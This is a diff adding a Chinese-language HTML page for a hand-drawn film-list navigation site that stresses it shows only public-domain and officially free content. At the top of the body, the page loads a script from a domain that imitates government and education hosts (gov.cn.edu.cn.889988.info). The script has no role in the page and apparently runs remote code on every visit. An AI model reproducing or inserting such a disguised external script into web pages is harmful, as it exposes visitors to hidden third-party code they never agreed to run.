@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>兔兔哒哒·片单小窝 - 手绘风影视导航 | tutudadatuyingshi-h5.github.io</title>
+<meta name="description" content="兔兔哒哒·片单小窝(tutudadatuyingshi-h5.github.io)是手绘涂鸦风示例影视导航站，整理公版/正版免费/官方开放片段片单；与达达兔卡通形象、商标及同名影视站无关。" />
+<meta name="keywords" content="兔兔哒哒,片单小窝,tutudadatuyingshi-h5,手绘影视导航,公版电影,正版免费" />
+<style>
+:root{
+  --cream:#fff7e8; --cream2:#ffeecb; --pink:#ff9bb8; --pink2:#f76d8e;
+  --carrot:#ff8a3d; --leaf:#7bc67a; --leaf2:#4a9c4a; --ink:#3a2b22; --ink2:#6b5747; --ink3:#a08c78;
+  --line:rgba(255,155,184,0.4); --shadow:0 6px 18px rgba(58,43,34,0.10);
+  --shadow2:0 14px 34px rgba(247,109,142,0.26);
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","Comic Sans MS",sans-serif;
+  background:
+    radial-gradient(circle at 16% 20%,rgba(255,155,184,0.16),transparent 46%),
+    radial-gradient(circle at 84% 80%,rgba(123,198,122,0.16),transparent 46%),
+    var(--cream);
+  color:var(--ink);line-height:1.85;overflow-x:hidden;
+}
+a{color:var(--pink2);text-decoration:none}
+img{max-width:100%;display:block}
+
+/* 胡萝卜飘 */
+.floaty{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}
+.floaty i{position:absolute;font-size:20px;opacity:.22;animation:bob 7s ease-in-out infinite}
+.floaty i:nth-child(1){top:12%;left:8%;animation-delay:0s}
+.floaty i:nth-child(2){top:26%;left:82%;color:var(--carrot);animation-delay:1.2s}
+.floaty i:nth-child(3){top:60%;left:14%;animation-delay:.6s}
+.floaty i:nth-child(4){top:74%;left:80%;color:var(--leaf);animation-delay:1.8s}
+@keyframes bob{0%,100%{transform:translateY(0) rotate(-4deg)}50%{transform:translateY(-12px) rotate(4deg)}}
+
+.burrow-head{position:relative;z-index:10;text-align:center;padding:52px 20px 36px;background:linear-gradient(180deg,var(--cream2),var(--cream));border-bottom:5px dotted var(--pink)}
+.bun-logo{width:96px;height:96px;margin:0 auto 14px;position:relative}
+.bun-logo .face{width:100%;height:100%;background:var(--pink);border-radius:50% 50% 48% 48%;display:flex;align-items:center;justify-content:center;font-size:44px;box-shadow:inset 0 -10px 0 rgba(0,0,0,0.06),var(--shadow);animation:wiggle 4s ease-in-out infinite}
+@keyframes wiggle{0%,100%{transform:rotate(-3deg)}50%{transform:rotate(3deg)}}
+.bun-logo .ear{position:absolute;top:-18px;width:26px;height:38px;background:var(--pink);border-radius:50% 50% 0 0}
+.bun-logo .ear.l{left:14px;transform:rotate(-12deg)}
+.bun-logo .ear.r{right:14px;transform:rotate(12deg)}
+.burrow-head h1{font-size:31px;font-weight:900;letter-spacing:3px;color:var(--ink)}
+.burrow-head h1 b{color:var(--carrot)}
+.disclaim{margin:8px auto 0;max-width:640px;font-size:12px;color:var(--pink2);background:rgba(255,255,255,0.7);border:1px dashed var(--pink);border-radius:8px;padding:6px 12px}
+.burrow-head p{max-width:560px;margin:10px auto 0;color:var(--ink2);font-size:15px}
+.nav{margin-top:22px;display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
+.nav a{padding:9px 20px;border:2px solid var(--pink);border-radius:999px;font-size:14px;font-weight:700;color:var(--ink);background:#fff;transition:.25s}
+.nav a:hover{background:var(--pink);border-color:var(--pink2);color:#fff}
+
+.bar{position:relative;z-index:10;background:var(--ink);color:var(--cream);padding:10px 20px;font-size:13px;display:flex;gap:18px;justify-content:center;flex-wrap:wrap}
+.bar b{color:var(--carrot)}
+
+.wrap{position:relative;z-index:10;max-width:980px;margin:0 auto;padding:0 18px 60px}
+.section{margin-bottom:54px;scroll-margin-top:20px}
+.sec-title{display:flex;align-items:center;gap:12px;margin-bottom:26px}
+.sec-title .patch{width:34px;height:34px;background:var(--leaf);color:#fff;display:flex;align-items:center;justify-content:center;font-size:18px;border-radius:8px 8px 2px 8px;transform:rotate(-5deg)}
+.sec-title h2{font-size:23px;font-weight:900;letter-spacing:2px;color:var(--leaf2)}
+.sec-title .ln{flex:1;height:3px;background:repeating-linear-gradient(90deg,var(--pink) 0 12px,transparent 12px 18px)}
+
+/* 胡萝卜田片单：左图右文的不对称涂鸦卡 */
+.carrot-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:20px}
+.carrot-card{position:relative;background:#fff;border:3px solid var(--pink);border-radius:26px 6px 26px 6px;padding:20px 20px 22px;box-shadow:var(--shadow);transition:.3s;overflow:hidden}
+.carrot-card::before{content:"🥕";position:absolute;top:-10px;right:-6px;font-size:44px;opacity:.16}
+.carrot-card::after{content:"";position:absolute;left:20px;right:20px;bottom:12px;height:2px;background:repeating-linear-gradient(90deg,var(--leaf) 0 6px,transparent 6px 12px)}
+.carrot-card:hover{transform:translateY(-5px) rotate(-1deg);box-shadow:var(--shadow2);border-color:var(--pink2)}
+.carrot-card .top{display:flex;align-items:center;gap:12px;margin-bottom:10px}
+.carrot-card .thumb{width:52px;height:52px;flex-shrink:0;border-radius:16px 4px 16px 4px;display:flex;align-items:center;justify-content:center;font-size:26px;color:#fff;background:var(--carrot)}
+.carrot-card .thumb.g{background:var(--leaf)}
+.carrot-card .thumb.b{background:var(--pink2)}
+.carrot-card .thumb.y{background:var(--carrot)}
+.carrot-card h3{font-size:17px;font-weight:800;color:var(--ink);margin:0}
+.carrot-card .tag{font-size:11px;color:var(--pink2);font-weight:700}
+.carrot-card .meta{font-size:12px;color:var(--ink3);margin:2px 0 8px}
+.carrot-card p{font-size:14px;color:var(--ink2);line-height:1.75}
+
+.hole-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:16px}
+.hole{text-align:center;background:#fff;border:3px solid var(--pink);border-radius:50% 50% 12px 12px;padding:22px 12px 20px;transition:.25s;cursor:pointer}
+.hole .ico{font-size:28px;margin-bottom:6px}
+.hole h4{font-size:15px;font-weight:800;color:var(--leaf2)}
+.hole p{font-size:12px;color:var(--ink3)}
+.hole:hover{background:var(--pink);border-color:var(--pink2)}
+.hole:hover h4,.hole:hover p{color:#fff}
+
+.about-block{background:#fff;border:3px dashed var(--pink);border-left:8px solid var(--carrot);border-radius:16px;padding:26px;font-size:15px;color:var(--ink2);line-height:1.95}
+.about-block b{color:var(--carrot)}
+
+.safe{position:relative;z-index:10;background:var(--leaf);color:#fff;padding:12px 20px;text-align:center;font-size:13px;display:flex;gap:20px;justify-content:center;flex-wrap:wrap;font-weight:700}
+.safe .x{color:#ffeecb;filter:grayscale(.2)}
+
+.footer{position:relative;z-index:10;text-align:center;padding:20px 16px;color:var(--ink3);font-size:12px;border-top:5px dotted var(--pink);background:var(--cream2)}
+
+@media(max-width:640px){
+  .burrow-head h1{font-size:23px;letter-spacing:2px}
+  .bun-logo{width:78px;height:78px}
+  .bun-logo .face{font-size:34px}
+  .carrot-grid{grid-template-columns:1fr}
+  .sec-title h2{font-size:19px}
+  .wrap{padding:0 14px 40px}
+  .hole-grid{grid-template-columns:repeat(2,1fr)}
+  .bar{gap:8px;font-size:12px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="floaty" aria-hidden="true"><i>🥕</i><i>🌱</i><i>☁️</i><i>🐇</i></div>
+
+<header class="burrow-head">
+  <div class="bun-logo">
+    <span class="ear l"></span><span class="ear r"></span>
+    <div class="face">🐰</div>
+  </div>
+  <h1>兔兔<b>哒哒</b> · 片单小窝</h1>
+  <div class="disclaim">⚠ 本站名称仅取“兔兔+哒哒”的叠词韵律，<b>与“达达兔”卡通形象、图书、商标、表情包及任何同名“达达兔影视”站均无关联</b>，未获任何授权，不使用其形象与 LOGO。</div>
+  <p>tutudadatuyingshi-h5.github.io —— 胡萝卜田里翻片单：公版老片、正版免费窗口、官方开放片段。手绘涂鸦风示例站，不播盗版、不导网盘。</p>
+  <nav class="nav">
+    <a href="#">洞口</a>
+    <a href="#list">胡萝卜片单</a>
+    <a href="#hole">兔子洞分类</a>
+    <a href="#about">关于小窝</a>
+  </nav>
+</header>
+
+<div class="bar">
+  <span>🥕 模式：<b>片单导航 / 示例站</b></span>
+  <span>🚫 不提供：盗版全片 / 破解播放器 / 网盘资源</span>
+  <span>✅ 只整理：公版 / 正版免费 / 官方开放</span>
+</div>
+
+<main class="wrap">
+
+  <section class="section" id="list">
+    <div class="sec-title"><span class="patch">🥕</span><h2>胡萝卜片单</h2><span class="ln"></span></div>
+    <div class="carrot-grid">
+      <article class="carrot-card">
+        <div class="top"><div class="thumb y">🎞</div><div><h3>小兔子先生</h3><span class="tag">公版 · 动画短片</span></div></div>
+        <div class="meta">1936 · 早期手绘卡通 · 公版流通</div>
+        <p>老卡通里那只穿背带裤的兔子，动作全靠逐帧手画。片单小窝第 001 号，献给所有爱画兔子的手。与任何现代兔形象无关。</p>
+      </article>
+      <article class="carrot-card">
+        <div class="top"><div class="thumb g">🌿</div><div><h3>柳林风声</h3><span class="tag">公版 · 文学改编</span></div></div>
+        <div class="meta">童话原著公版 · 多版动画</div>
+        <p>河岸、柳林、鼹鼠和蛤蟆先生。属于“兔子也爱看”的治愈系，官方开放片段够你先尝一口甜。</p>
+      </article>
+      <article class="carrot-card">
+        <div class="top"><div class="thumb b">🐇</div><div><h3>猜猜谁来吃晚餐</h3><span class="tag">冷门 · 实验短片</span></div></div>
+        <div class="meta">公版实验动画合集</div>
+        <p>一只兔影、一桌空椅、三分钟无声。冷门片库里最适合下饭的一格，看完会心一笑的那种。</p>
+      </article>
+      <article class="carrot-card">
+        <div class="top"><div class="thumb y">🎬</div><div><h3>淘金记</h3><span class="tag">公版 · 默片</span></div></div>
+        <div class="meta">1925 · 卓别林 · 公版</div>
+        <p>煮皮鞋那场戏是全人类的喜剧公约数。黑白片不老，兔子看了也想鼓掌。</p>
+      </article>
+      <article class="carrot-card">
+        <div class="top"><div class="thumb g">📺</div><div><h3>我们的星球</h3><span class="tag">正版免费</span></div></div>
+        <div class="meta">自然纪录 · 官方开放片段</div>
+        <p>雪豹跳崖、珊瑚产卵，官方放出的可嵌入片段。不用去盗版站，也能把客厅变成自然馆。</p>
+      </article>
+      <article class="carrot-card">
+        <div class="top"><div class="thumb b">🌼</div><div><h3>城南旧事</h3><span class="tag">国产老片修复</span></div></div>
+        <div class="meta">1983 · 正版修复版可看</div>
+        <p>“爸爸的花儿落了”，一句台词就把童年关门声拍进来了。老片修复，是最温柔的回放。</p>
+      </article>
+    </div>
+  </section>
+
+  <section class="section" id="hole">
+    <div class="sec-title"><span class="patch">🕳</span><h2>兔子洞分类</h2><span class="ln"></span></div>
+    <div class="hole-grid">
+      <div class="hole"><div class="ico">🎞️</div><h4>公版动画</h4><p>老卡通/默片</p></div>
+      <div class="hole"><div class="ico">📺</div><h4>正版免费</h4><p>平台开放集</p></div>
+      <div class="hole"><div class="ico">🌿</div><h4>童话绘本</h4><p>公版改编</p></div>
+      <div class="hole"><div class="ico">🎬</div><h4>国产老片</h4><p>修复专区</p></div>
+      <div class="hole"><div class="ico">🎞️</div><h4>自然纪录</h4><p>官方片段</p></div>
+      <div class="hole"><div class="ico">🌙</div><h4>冷门短片</h4><p>实验/无声</p></div>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <div class="sec-title"><span class="patch">ℹ</span><h2>关于小窝</h2><span class="ln"></span></div>
+    <div class="about-block">
+      <p>
+        <b>兔兔哒哒·片单小窝</b>（tutudadatuyingshi-h5.github.io）是一个以“胡萝卜田 / 手绘涂鸦”为气质的<b>独立示例影视导航单页</b>。
+        名称仅借用“兔兔+哒哒”的叠词节奏，<b>不是“达达兔”影视站、不使用芦大卫创作的达达兔形象/图书/商标/表情包，也不仿冒任何同名盗版聚合 App 或站点</b>。
+        本页只做片单整理：公版老片、正版免费可看内容、平台官方开放片段；
+        不提供盗版播放、不导网盘、不引导装播放器。
+        移动端自适应，内链以 # 占位，不生成 robots.txt / sitemap.xml，内容仅供学习交流。
+      </p>
+    </div>
+  </section>
+
+</main>
+
+<div class="safe">
+  <span>✓ 不播盗版全片</span>
+  <span>✓ 不导网盘资源</span>
+  <span><span class="x">✕</span> 不碰“达达兔”形象/商标</span>
+  <span>✓ 只做正版/公版导航</span>
+</div>
+
+<footer class="footer">
+  © 2026 兔兔哒哒·片单小窝（独立示例站） | tutudadatuyingshi-h5.github.io | 与达达兔卡通形象/商标/同名影视站无关 | 内链以 # 占位
+</footer>
+
+</body>
+</html>
